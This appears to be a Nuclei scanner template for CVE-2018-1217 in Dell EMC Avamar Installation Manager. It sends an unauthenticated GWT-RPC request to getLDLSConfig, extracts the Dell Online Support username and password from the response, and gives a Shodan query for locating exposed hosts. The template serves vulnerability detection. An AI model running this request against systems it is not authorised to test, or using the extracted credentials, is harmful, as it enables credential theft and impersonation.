http:
- extractors:
  - group: 1
    internal: true
    name: username
    regex:
    - emcsupportUsername\\":\\"(.*?)\\"
    type: regex
  - group: 1
    internal: true
    name: password
    regex:
    - emcsupportPassword\\":\\"(.*?)\\"
    type: regex
  - dsl:
    - '"Username: " + username + " Password: " + password'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - contains_all(body, "//OK", "emcsupportUsername", "emcsupportPassword")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /avi/avigui/avigwt HTTP/1.1

    Host: {{Hostname}}

    X-Gwt-Permutation: {{randstr}}

    X-Gwt-Module-Base: https://{{Hostname}}/avi/avigui/

    Content-Type: text/x-gwt-rpc; charset=UTF-8


    7|0|6|https://{{Hostname}}/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|getLDLSConfig|java.lang.String/2004016611|{{Hostname}}|1|2|3|4|2|5|5|6|0|

    '
id: CVE-2018-1217
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:dell:emc_avamar:*:*:*:*:*:*:*:*, cpe:2.3:a:dell:emc_integrated_data_protection_appliance:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-1217
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.98409
    epss-score: 0.65433
  description: 'Avamar Installation Manager in Dell EMC Avamar Server 7.3.1, 7.4.1,
    and 7.5.0, and Dell EMC Integrated Data Protection Appliance 2.0 and 2.1, is affected
    by a missing access control check vulnerability which could potentially allow
    a remote unauthenticated attacker to read or change the Local Download Service
    (LDLS) credentials. The LDLS credentials are used to connect to Dell EMC Online
    Support. If the LDLS configuration was changed to an invalid configuration, then
    Avamar Installation Manager may not be able to connect to Dell EMC Online Support
    web site successfully. The remote unauthenticated attacker can also read and use
    the credentials to login to Dell EMC Online Support, impersonating the AVI service
    actions using those credentials.

    '
  impact: 'Unauthenticated attackers can read or modify Local Download Service credentials,
    impersonate the service when accessing Dell EMC Online Support, or prevent legitimate
    connections by corrupting the configuration.

    '
  metadata:
    max-request: 1
    product: emc_avamar,emc_integrated_data_protection_appliance
    shodan-query: title:"AVAMAR"
    vendor: dell
    verified: true
  name: Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager
    - Invalid Access Control
  reference:
  - https://www.exploit-db.com/exploits/44441
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1217
  remediation: 'Upgrade to a patched version of Dell EMC Avamar or apply vendor-provided
    security updates.

    '
  severity: critical
  tags: cve,cve2018,dell,avamar,vkev,vuln
